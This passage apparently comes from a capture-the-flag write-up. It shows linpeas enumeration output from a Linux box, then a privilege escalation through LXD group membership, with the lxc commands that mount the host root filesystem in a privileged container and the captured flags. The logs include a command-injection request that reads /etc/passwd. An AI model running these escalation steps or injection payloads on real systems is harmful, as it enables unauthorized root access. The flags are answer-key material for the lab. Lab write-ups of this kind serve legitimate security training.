/home/john/.viminfo
/root/
/var/www
/var/www/html
/var/www/html/.htaccess
/var/www/html/robots.txt
/var/www/html/uploads
/var/www/html/secret

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/home/john                                                                                                                                                                                                                                  
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root dip 656 Dec  6  2019 /snap/core/8268/etc/chatscripts/provider                                                                                                                                                             
-rw-r----- 1 root dip 1093 Dec  6  2019 /snap/core/8268/etc/ppp/peers/provider
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/dmesg
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/fsck/checkroot
-rw-r----- 1 root dip 656 Jun 21  2019 /snap/core/7270/etc/chatscripts/provider
-rw-r----- 1 root dip 1093 Jun 21  2019 /snap/core/7270/etc/ppp/peers/provider
-rw-r----- 1 root adm 31 Jun 21  2019 /snap/core/7270/var/log/dmesg
-rw-r----- 1 root adm 31 Jun 21  2019 /snap/core/7270/var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Jun 21  2019 /snap/core/7270/var/log/fsck/checkroot
-rw-r----- 1 root adm 0 Feb  5  2020 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 26969414 Nov  5 02:35 /var/log/apache2/access.log
-rw-r----- 1 root adm 8106923 Nov  5 02:30 /var/log/apache2/error.log
-rw-r----- 1 root adm 39662 Feb  5  2020 /var/log/apt/term.log

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/john/.config/lxc/cookies                                                                                                                                                                                                              
/home/john/.gnupg/trustdb.gpg
/home/john/.gnupg/pubring.kbx
/var/log/auth.log
/var/log/journal/abfc7bcbbd074564bafd60509357b111/system.journal
/var/log/journal/abfc7bcbbd074564bafd60509357b111/user-1000.journal
/var/log/apache2/access.log
/var/log/kern.log
/var/log/syslog
/var/log/lxd/lxd.log

logrotate 3.11.0

╔══════════╣ Files inside /home/john (limit 20)
total 60                                                                                                                                                                                                                                    
drwxr-xr-x 8 john john  4096 Jul 27  2020 .
drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
drwx------ 2 john john  4096 Feb  5  2020 .cache
drwxr-x--- 3 john john  4096 Jul 27  2020 .config
drwx------ 3 john john  4096 Nov  5 02:34 .gnupg
drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
-rw-r--r-- 1 john john   807 Apr  4  2018 .profile
drwx------ 2 john john  4096 Feb  5  2020 .ssh
-rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
-rw------- 1 root root 12070 Jul 27  2020 .viminfo

╔══════════╣ Files inside others home (limit 20)
/var/www/html/character-four-archive.jpg                                                                                                                                                                                                    
/var/www/html/index.html
/var/www/html/bg-header.jpg
/var/www/html/featured-suns.png
/var/www/html/.htaccess
/var/www/html/bg-dragaan-myths.png
/var/www/html/robots.txt
/var/www/html/bg-connect.png
/var/www/html/uploads/dict.lst
/var/www/html/uploads/meme.jpg
/var/www/html/uploads/manifesto.txt
/var/www/html/myths.html
/var/www/html/button.png
/var/www/html/logo.png
/var/www/html/character-one-archive.jpg
/var/www/html/style.css
/var/www/html/about.html
/var/www/html/video.jpg
/var/www/html/bg-featured.png
/var/www/html/menu.png

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2765 Aug  5  2019 /etc/apt/sources.list.curtin.old                                                                                                                                                                   
-rw-r--r-- 1 root root 7857 Jan 17  2020 /lib/modules/4.15.0-76-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 Jan 17  2020 /lib/modules/4.15.0-76-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 0 Jan 17  2020 /usr/src/linux-headers-4.15.0-76-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jan 17  2020 /usr/src/linux-headers-4.15.0-76-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 217506 Jan 17  2020 /usr/src/linux-headers-4.15.0-76-generic/.config.old
-rw-r--r-- 1 root root 2746 Dec  5  2019 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 11755 Feb  5  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 35544 Dec  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /snap/core/7270/lib/firmware/regulatory.db: CRDA wireless regulatory database file                                                                                                                                                    
Found /snap/core/8268/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                                  
total 12K
drwxr-xr-x  3 root root 4.0K Feb  5  2020 .
drwxr-xr-x 14 root root 4.0K Feb  5  2020 ..
drwxr-xr-x  4 root root 4.0K Feb 10  2020 html

/var/www/html:
total 2.6M
drwxr-xr-x 4 root     root     4.0K Feb 10  2020 .
drwxr-xr-x 3 root     root     4.0K Feb  5  2020 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Aug  5  2019 /etc/.pwd.lock                                                                                                                                                                                        
-rw-r--r-- 1 root root 1531 Feb  5  2020 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-r--r-- 1 john john 220 Apr  4  2018 /home/john/.bash_logout
-rw-r--r-- 1 root root 106 Feb  5  2020 /home/john/.vim/.netrwhist
-rw------- 1 root root 0 Dec  6  2019 /snap/core/8268/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/8268/etc/skel/.bash_logout
-rw------- 1 root root 0 Jun 21  2019 /snap/core/7270/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/7270/etc/skel/.bash_logout
-rw-r--r-- 1 root root 61 Feb  5  2020 /var/www/html/.htaccess
-rw-r--r-- 1 landscape landscape 0 Aug  5  2019 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 1531 Feb  5  2020 /var/cache/apparmor/.features
-rw-r--r-- 1 root root 37 Nov  5 02:09 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Nov  5 02:08 /run/cloud-init/.ds-identify.result

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 30671 Feb  5  2020 /var/backups/apt.extended_states.0                                                                                                                                                                

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/dev/shm/linpeas.sh
/home/john
/run/lock
/run/screen
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/snap/core/7270/run/lock
/snap/core/7270/tmp
/snap/core/7270/var/tmp
/snap/core/8268/run/lock
/snap/core/8268/tmp
/snap/core/8268/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1000
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-7270.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8268.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
/var/lib/php/sessions
/var/tmp
/var/www/html/uploads/dict.lst
/var/www/html/uploads/manifesto.txt

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
  Group john:                                                                                                                                                                                                                               
/dev/shm/linpeas.sh                                                                                                                                                                                                                         

╔══════════╣ Searching passwords in history files
                                                                                                                                                                                                                                            
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
10.18.23.136 - - [05/Nov/2022:02:14:48 +0000] "GET /cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download" 400 0 "-" "-"                                                                                                                  
10.18.23.136 - - [05/Nov/2022:02:17:44 +0000] "GET /.htpasswd HTTP/1.1" 403 491 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002739)"
10.8.5.10 - - [27/Jul/2020:19:56:34 +0000] "GET /.htpasswd HTTP/1.1" 403 438 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.8.5.10 - - [27/Jul/2020:19:56:34 +0000] "GET /.htpasswd_ HTTP/1.1" 403 438 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.8.5.10 - - [27/Jul/2020:19:58:03 +0000] "GET /.htpasswd HTTP/1.1" 403 438 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.8.5.10 - - [27/Jul/2020:19:58:03 +0000] "GET /.htpasswd_ HTTP/1.1" 403 438 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.0.16 - - [05/Feb/2020:11:00:06 +0000] "GET /.htpasswd HTTP/1.1" 403 438 "-" "gobuster/3.0.1"
2019-08-05 19:22:58 configure base-passwd:amd64 3.5.44 3.5.44
2019-08-05 19:22:58 install base-passwd:amd64 <none> 3.5.44
2019-08-05 19:22:58 status half-configured base-passwd:amd64 3.5.44
2019-08-05 19:22:58 status half-installed base-passwd:amd64 3.5.44
2019-08-05 19:22:58 status installed base-passwd:amd64 3.5.44
2019-08-05 19:22:58 status unpacked base-passwd:amd64 3.5.44
2019-08-05 19:22:59 status half-configured base-passwd:amd64 3.5.44
2019-08-05 19:22:59 status half-installed base-passwd:amd64 3.5.44
2019-08-05 19:22:59 status unpacked base-passwd:amd64 3.5.44
2019-08-05 19:22:59 upgrade base-passwd:amd64 3.5.44 3.5.44
2019-08-05 19:23:02 install passwd:amd64 <none> 1:4.5-1ubuntu1
2019-08-05 19:23:02 status half-installed passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:02 status unpacked passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:03 configure base-passwd:amd64 3.5.44 <none>
2019-08-05 19:23:03 status half-configured base-passwd:amd64 3.5.44
2019-08-05 19:23:03 status installed base-passwd:amd64 3.5.44
2019-08-05 19:23:03 status unpacked base-passwd:amd64 3.5.44
2019-08-05 19:23:04 configure passwd:amd64 1:4.5-1ubuntu1 <none>
2019-08-05 19:23:04 status half-configured passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:04 status installed passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:04 status unpacked passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:48 configure passwd:amd64 1:4.5-1ubuntu2 <none>
2019-08-05 19:23:48 status half-configured passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:48 status half-configured passwd:amd64 1:4.5-1ubuntu2
2019-08-05 19:23:48 status half-installed passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:48 status installed passwd:amd64 1:4.5-1ubuntu2
2019-08-05 19:23:48 status unpacked passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:48 status unpacked passwd:amd64 1:4.5-1ubuntu2
2019-08-05 19:23:48 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
2020-02-05 09:08:36,018 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
2020-02-05 09:08:36,136 - cc_set_passwords.py[DEBUG]: Restarted the ssh daemon.
2020-02-05 09:08:36,137 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2020-02-05 09:30:42,902 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-05 09:30:42,902 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-02-05 09:32:32,792 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-05 09:32:32,792 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-02-05 09:57:36,642 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-05 09:57:36,642 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-02-05 12:22:21,889 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-05 12:22:21,889 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-02-05 15:47:47,031 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-05 15:47:47,031 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-02-05 15:49:28,376 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-05 15:49:28,376 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-02-10 22:58:38,661 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-10 22:58:38,661 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-02-11 10:52:51,852 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-11 10:52:51,852 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-07-27 19:56:25,592 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-07-27 19:56:25,592 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-11-05 02:10:15,043 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-11-05 02:10:15,043 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
Binary file /var/log/apache2/error.log matches
Binary file /var/log/auth.log matches
Binary file /var/log/journal/abfc7bcbbd074564bafd60509357b111/system@00059dd6146b76a2-da38d09009bcc516.journal~ matches
Binary file /var/log/journal/abfc7bcbbd074564bafd60509357b111/system@00059e4aa781ba65-9aed6a00b0e00f11.journal~ matches
Binary file /var/log/journal/abfc7bcbbd074564bafd60509357b111/system.journal matches
Binary file /var/log/journal/abfc7bcbbd074564bafd60509357b111/user-1000@00059dd614cb9fbb-8f73e6dcdd236b8b.journal~ matches
Binary file /var/log/journal/abfc7bcbbd074564bafd60509357b111/user-1000.journal matches
Binary file /var/log/syslog matches
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════       
```

It seems we are in the group of lxc.

Following instructions from [1] we managed to privesc. The host filesystem is mounted on /mnt/root.

Let's get the flag
```
/mnt/root # cat root/root.txt 

2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

## Flag

1. User

```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

2. Privesc

```
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

## To Go Further

The idea of this privesc is to build another container, and initialize it with privileged permission
```
lxc init alpine privesc -c security.privileged=true --alias=alpine
```

Then mount the host filesytem in the container with root privileges
```
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Then execute the container
```
lxc start privesc
lxc exec privesc /bin/sh
```

Because we have root privileges in the container and ```security.privileged``` have been set to ```true``` and host filesystem is mounted to ```/mnt/root``` we can have root privileges on host.
